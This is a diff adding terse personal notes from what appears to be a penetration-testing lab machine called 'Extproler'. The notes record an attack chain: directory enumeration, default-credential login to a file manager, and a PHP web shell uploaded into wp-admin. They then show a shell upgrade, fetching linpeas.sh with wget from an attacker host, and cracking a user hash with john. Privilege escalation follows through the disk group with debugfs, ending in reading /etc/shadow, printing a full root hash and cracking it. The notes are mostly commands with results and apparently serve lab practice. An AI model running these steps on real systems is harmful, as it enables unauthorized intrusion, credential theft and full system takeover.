@@ -1,0 +1,46 @@
+	Extproler
+	
+192.168.184.16
+redirected on http://192.168.184.16/wp-admin/setup-config.php?step=1
+
+ dirb http://192.168.184.16
+ http://192.168.184.16/filemanager/  
+ Open 
+ login with default credential 
+ 
+ upload shell.php the file wp-admin
+ 192.168.184.16/wp-admin/shell.php
+ this work
+ 
+ 
+Got shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+cd /tmp
+wget http://192.168.45.173:440/linpeas.sh
+
+chmod +x linpeas.sh
+dora is a user
+I remind there is dora asking for password 
+changed password for dora but didn't work 
+
+then i decided to search for hashes of dora 
+
+john dora.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+doraemon
+
+dora is the member of disk found after running linpeas.sh
+https://www.hackingarticles.in/disk-group-privilege-escalation/
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+mkdir test 
+allow read only 
+cat /root/.ssh/authorized_keys
+No key found 
+
+cat /etc/shadow
+got root hashes
+root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
+john root.txt --wordlist=/usr/share/wordlists/rockyou.txt
+got password
+explorer
